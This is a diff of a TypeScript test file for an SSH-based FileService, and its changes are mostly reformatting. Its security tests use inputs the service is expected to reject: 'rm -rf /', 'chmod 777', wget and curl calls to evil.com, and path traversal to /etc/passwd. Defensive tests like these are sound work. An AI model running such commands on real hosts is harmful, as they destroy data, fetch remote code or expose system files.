@@ -105,12 +105,7 @@ describe("FileService", () => {
     it("executes command in working directory", async () => {
       vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue("output");
 
-      const result = await fileService.executeCommand(
-        testHost,
-        "/tmp",
-        "ls -la",
-        30000
-      );
+      const result = await fileService.executeCommand(testHost, "/tmp", "ls -la", 30000);
 
       expect(mockSSHService.executeSSHCommand).toHaveBeenCalledWith(
         testHost,
@@ -134,17 +129,17 @@ describe("FileService", () => {
 
       it("blocks: rm, mv, cp, chmod, chown", async () => {
         for (const cmd of ["rm -rf /", "mv file dest", "chmod 777 file"]) {
-          await expect(
-            fileService.executeCommand(testHost, "/tmp", cmd, 30000)
-          ).rejects.toThrow(/not in allowed list/);
+          await expect(fileService.executeCommand(testHost, "/tmp", cmd, 30000)).rejects.toThrow(
+            /not in allowed list/
+          );
         }
       });
 
       it("blocks: wget, curl (network commands)", async () => {
         for (const cmd of ["wget http://evil.com", "curl http://evil.com"]) {
-          await expect(
-            fileService.executeCommand(testHost, "/tmp", cmd, 30000)
-          ).rejects.toThrow(/not in allowed list/);
+          await expect(fileService.executeCommand(testHost, "/tmp", cmd, 30000)).rejects.toThrow(
+            /not in allowed list/
+          );
         }
       });
 
@@ -161,7 +156,9 @@ describe("FileService", () => {
 
   describe("findFiles", () => {
     it("searches with pattern", async () => {
-      vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue("/var/log/syslog\n/var/log/auth.log");
+      vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue(
+        "/var/log/syslog\n/var/log/auth.log"
+      );
 
       const result = await fileService.findFiles(testHost, "/var", "*.log", {});
 
@@ -250,11 +247,7 @@ describe("FileService", () => {
       const diffOutput = "--- a/hosts\n+++ b/hosts\n@@ -1,2 +1,3 @@\n localhost\n+newhost";
       vi.mocked(mockSSHService.executeSSHCommand).mockResolvedValue(diffOutput);
 
-      const result = await fileService.diffFiles(
-        testHost, "/etc/hosts",
-        testHost, "/tmp/hosts",
-        3
-      );
+      const result = await fileService.diffFiles(testHost, "/etc/hosts", testHost, "/tmp/hosts", 3);
 
       expect(result).toContain("---");
       expect(result).toContain("+++");
@@ -266,11 +259,7 @@ describe("FileService", () => {
         .mockResolvedValueOnce("content A")
         .mockResolvedValueOnce("content B");
 
-      const result = await fileService.diffFiles(
-        testHost, "/tmp/fileA",
-        host2, "/tmp/fileB",
-        3
-      );
+      const result = await fileService.diffFiles(testHost, "/tmp/fileA", host2, "/tmp/fileB", 3);
 
       expect(result).toContain("---");
       expect(result).toContain("+++");
@@ -282,11 +271,7 @@ describe("FileService", () => {
         .mockResolvedValueOnce("same content")
         .mockResolvedValueOnce("same content");
 
-      const result = await fileService.diffFiles(
-        testHost, "/tmp/fileA",
-        host2, "/tmp/fileB",
-        3
-      );
+      const result = await fileService.diffFiles(testHost, "/tmp/fileA", host2, "/tmp/fileB", 3);
 
       expect(result).toContain("identical");
     });
@@ -294,19 +279,19 @@ describe("FileService", () => {
 
   describe("security", () => {
     it("validates paths before execution", async () => {
-      await expect(
-        fileService.readFile(testHost, "/../etc/passwd", 1000)
-      ).rejects.toThrow(/traversal|invalid/i);
+      await expect(fileService.readFile(testHost, "/../etc/passwd", 1000)).rejects.toThrow(
+        /traversal|invalid/i
+      );
 
-      await expect(
-        fileService.listDirectory(testHost, "/var/../etc", false)
-      ).rejects.toThrow(/traversal|invalid/i);
+      await expect(fileService.listDirectory(testHost, "/var/../etc", false)).rejects.toThrow(
+        /traversal|invalid/i
+      );
     });
 
     it("rejects relative paths", async () => {
-      await expect(
-        fileService.readFile(testHost, "relative/path", 1000)
-      ).rejects.toThrow(/absolute|invalid/i);
+      await expect(fileService.readFile(testHost, "relative/path", 1000)).rejects.toThrow(
+        /absolute|invalid/i
+      );
     });
 
     it("escapes shell arguments", async () => {
@@ -316,7 +301,7 @@ describe("FileService", () => {
 
       expect(mockSSHService.executeSSHCommand).toHaveBeenCalledWith(
         testHost,
-        expect.stringContaining("'"),  // Single quotes indicate escaping
+        expect.stringContaining("'"), // Single quotes indicate escaping
         [],
         expect.any(Object)
       );
